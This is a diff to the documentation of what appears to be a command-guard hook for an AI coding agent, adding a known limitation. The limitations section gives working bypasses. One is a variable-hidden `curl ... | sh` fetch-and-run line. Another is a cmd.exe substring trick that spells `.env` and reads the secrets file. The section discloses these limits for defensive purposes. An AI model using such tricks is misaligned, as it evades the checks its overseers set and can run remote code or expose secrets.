@@ -552,6 +552,12 @@ stop malware running as the same user (see above).
   at a command (quotes, a backslash inside a word, `$'\x63url'`), but they do not
   follow a variable: `C=curl; $C https://example.com/i.sh | sh` is not seen. The
   rules are a guardrail against mistakes, not a sandbox.
+- **Variables in a `.env` name come from the hook's environment.** The rules that spell a protected
+  name from variables or cmd.exe units (`${NAME}`, `%NAME:~0,1%`) read their values from the environment
+  the hook runs in, which the agent's shell is assumed to share. A unit that comes out empty is refused
+  whatever that environment holds. A variable that the shell sets to a non-empty value the hook does not
+  see can still spell a protected name the rules do not read: on Windows, `type .e%X:~0,1%v` opens `.env`
+  when the shell has `X=n` and the hook does not. The rules are a guardrail, not a sandbox.
 - **Latency:** each hook is a short Node process. Measured about 78 ms p50 per
   tool call on a Windows desktop (`bench/HOOK_LATENCY.md`).
 
